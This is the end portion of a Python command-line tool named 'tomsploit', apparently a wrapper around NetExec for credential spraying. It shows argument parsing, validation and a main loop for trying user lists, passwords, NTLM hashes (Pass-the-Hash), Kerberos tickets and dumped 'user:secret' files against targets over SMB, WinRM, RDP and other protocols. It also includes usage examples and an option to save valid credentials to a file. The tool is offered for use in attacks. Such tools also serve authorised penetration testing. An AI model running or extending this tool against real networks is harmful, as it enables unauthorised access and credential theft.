  tomsploit -t 192.168.1.10 -u admin -k
  tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
  tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
""",
    )
    p.add_argument("-t", "--target", required=True,
                   help="IP, hostname, CIDR, or file containing any of these.")
    p.add_argument("-u", "--user",
                   help="Username or path to users file. "
                        "(Optional when --combo is used.)")
    p.add_argument("-p", "--password",
                   help="Password or path to passwords file.")
    p.add_argument("-H", "--hash",
                   help="NTLM hash (LM:NT or NT). May be a file of hashes.")
    p.add_argument("-k", "--kerberos", action="store_true",
                   help="Use Kerberos ticket cache (--use-kcache). "
                        "Requires KRB5CCNAME. Cannot mix with -p/-H.")
    p.add_argument("--paired", action="store_true",
                   help="Positional pairing instead of cross-spray: line N of "
                        "the users file is tried only against line N of the "
                        "password/hash file (e.g. dumped usernames.txt + "
                        "hashes.txt). All provided lists must be the same length.")
    p.add_argument("--combo", metavar="FILE",
                   help="Combined 'user:secret' file, one pair per line "
                        "(implies positional pairing). Each secret is "
                        "auto-detected: an NTLM hash (32 hex, or LM:NT) is "
                        "tried as Pass-the-Hash, anything else as a password. "
                        "Replaces -u/-p/-H; split on the first ':' so "
                        "passwords may contain colons.")
    p.add_argument("-o", "--output",
                   help="nxc log file path (default: YYYY-MM-DD_HH-MM-SS.txt).")
    p.add_argument("--creds-file", metavar="FILE",
                   help="Append valid credentials to a TSV file.")
    p.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
                   help=f"Parallel workers (default: {DEFAULT_WORKERS}).")
    p.add_argument("--protocols", metavar="LIST",
                   help=f"Comma-separated subset. Valid: {','.join(ALL_PROTOCOLS)}")
    p.add_argument("--no-port-probe", action="store_true",
                   help="Skip pre-flight TCP port probe.")
    p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
                   help=f"Max hosts in any one CIDR (default: {DEFAULT_MAX_CIDR_HOSTS}).")
    verbosity = p.add_mutually_exclusive_group()
    verbosity.add_argument("-q", "--quiet", action="store_true",
                   help="Minimal output: just valid creds + suggested "
                        "commands (and any credential alarms).")
    verbosity.add_argument("-v", "--verbose", action="store_true",
                   help="Show every nxc line, including each failed login "
                        "(off by default — failures collapse to a count).")
    p.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colors.")
    p.add_argument("--debug", action="store_true",
                   help="Print full Python tracebacks on errors.")
    p.add_argument("--json-output", metavar="FILE",
                   help="Write structured results to a JSON file.")
    return p.parse_args()


def build_config(args: argparse.Namespace) -> Config:
    """Validate the parsed args and expand files/CIDRs into one Config.
    Raises ValueError with a user-facing message on any bad combination."""
    raw_targets = read_value_or_file(args.target)
    targets = expand_targets(raw_targets, args.max_cidr_hosts)
    if not targets:
        raise ValueError("No targets after expansion.")

    paired = args.paired

    if args.combo:
        # Combined user:secret file. Supplies its own users + secrets and
        # always runs positional (paired). Cannot mix with -u/-p/-H/-k.
        if args.user or args.password or args.hash or args.kerberos:
            raise ValueError("--combo replaces -u/-p/-H/-k; don't pass them together.")
        users, passwords, hashes, warns = parse_combo_file(args.combo)
        for w in warns:
            print(f"{YELLOW}--combo {w}{RESET}", file=sys.stderr)
        if not users:
            raise ValueError(f"--combo: no usable 'user:secret' lines in '{args.combo}'.")
        paired = True
    else:
        if args.kerberos and (args.password or args.hash):
            raise ValueError("-k cannot combine with -p or -H.")
        if not args.kerberos and not args.password and not args.hash:
            raise ValueError("need one of -p, -H, --combo, or -k.")
        if not args.user:
            raise ValueError("need -u (or use --combo).")

        users = read_value_or_file(args.user)
        if not users:
            raise ValueError("No users provided.")
        passwords = read_value_or_file(args.password) if args.password else []
        hashes = read_value_or_file(args.hash) if args.hash else []

        if paired:
            # (kerberos and no-secret are already rejected by the generic
            # checks above; paired only adds the length-agreement rules.)
            # In paired mode the user list must line up with each secret list.
            if len(users) == 1:
                raise ValueError(
                    "--paired expects a users FILE with one user per line "
                    "(got a single user). Use the default mode for one user.")
            if passwords and len(passwords) != len(users):
                raise ValueError(
                    f"--paired: users ({len(users)}) and passwords "
                    f"({len(passwords)}) must have the same number of lines.")
            if hashes and len(hashes) != len(users):
                raise ValueError(
                    f"--paired: users ({len(users)}) and hashes "
                    f"({len(hashes)}) must have the same number of lines.")

    protocols = parse_protocol_list(args.protocols)
    if not protocols:
        raise ValueError("No protocols selected.")

    log_file = args.output            # only write a log when -o/--output is given

    return Config(
        targets=targets, users=users, passwords=passwords, hashes=hashes,
        kerberos=args.kerberos, protocols=protocols, log_file=log_file,
        creds_file=args.creds_file, json_out=args.json_output,
        workers=args.workers, quiet=args.quiet, verbose=args.verbose,
        debug=args.debug, no_port_probe=args.no_port_probe,
        paired=paired,
    )


def main() -> int:
    args = parse_args()
    configure_colors(args.no_color)

    if not shutil.which("nxc"):
        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not on PATH.",
              file=sys.stderr)
        return 1

    try:
        cfg = build_config(args)
        reporter = Reporter(cfg)
        runner = TomSploit(cfg, reporter)
    except ValueError as exc:
        print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
        return 1

    interrupted = {"n": 0}

    def _sigint(_signum, _frame):
        interrupted["n"] += 1
        if interrupted["n"] == 1:
            sys.stderr.write(
                f"\n  {YELLOW}{BOLD}⚠ Cancelling — Ctrl-C again to force.{RESET}\n"
            )
            sys.stderr.flush()
            runner.cancel()
        else:
            os._exit(130)
    signal.signal(signal.SIGINT, _sigint)

    _real_stdout = sys.stdout
    sys.stdout = _BlankCollapser(_real_stdout)
    try:
        return runner.run()
    except KeyboardInterrupt:
        runner.cancel()
        return 130
    finally:
        sys.stdout.flush()
        sys.stdout = _real_stdout


if __name__ == "__main__":
    sys.exit(main())

# ── MIT License ────────────────────────────────────────────────────────
# Copyright (c) 2026 Kazgangap
# Modifications Copyright (c) 2026 twhitehead290
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
